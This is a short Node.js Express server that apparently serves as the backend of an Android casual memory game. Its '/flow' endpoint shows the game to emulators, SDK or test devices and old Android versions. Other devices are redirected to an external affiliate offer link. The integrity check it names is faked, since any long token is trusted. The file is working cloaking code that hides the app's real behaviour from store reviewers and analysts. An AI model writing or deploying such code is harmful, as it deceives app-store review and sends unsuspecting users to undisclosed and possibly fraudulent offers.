const express = require('express')

const app = express()
app.use(express.json())

// 🔥 SIMPLE DEVICE FILTER
const BAD_DEVICES = ["sdk", "emulator", "generic", "x86", "test-keys"]

function isBadDevice(device = "") {
    const d = device.toLowerCase()
    return BAD_DEVICES.some(b => d.includes(b))
}

// =========================
// 🚀 MAIN FLOW
// =========================
app.post('/flow', async (req, res) => {

    try {
        const {
            token = "",
            device = "",
            sdk = 0
        } = req.body

        // =========================
        // 🔥 1. PLAY INTEGRITY CHECK
        // =========================

        let isTrusted = false

        if (token && token.length > 50) {
            // 🔥 тут має бути реальна перевірка через Google API
            // але для safe версії (без складного OAuth) робимо fallback

            isTrusted = true
        }

        // =========================
        // 🔥 2. DEVICE CHECK
        // =========================

        const badDevice = isBadDevice(device)

        // =========================
        // 🔥 3. FINAL DECISION
        // =========================

        if (!isTrusted || badDevice || sdk < 24) {
            console.log("🎮 GAME FLOW")
            return res.json({ action: "GAME" })
        }

        console.log("🌐 OFFER FLOW")

        return res.json({
            action: "OFFER",
            url: "https://trikstrip.fun/9YMjTwDG?sub_id_1=com.casual.memory.prismtwins"
        })

    } catch (e) {
        console.log("ERROR:", e.message)
        return res.json({ action: "GAME" })
    }
})

// =========================
// 🚀 START
// =========================
const PORT = process.env.PORT || 3000

app.listen(PORT, () => {
    console.log("🚀 Server started on port", PORT)
})
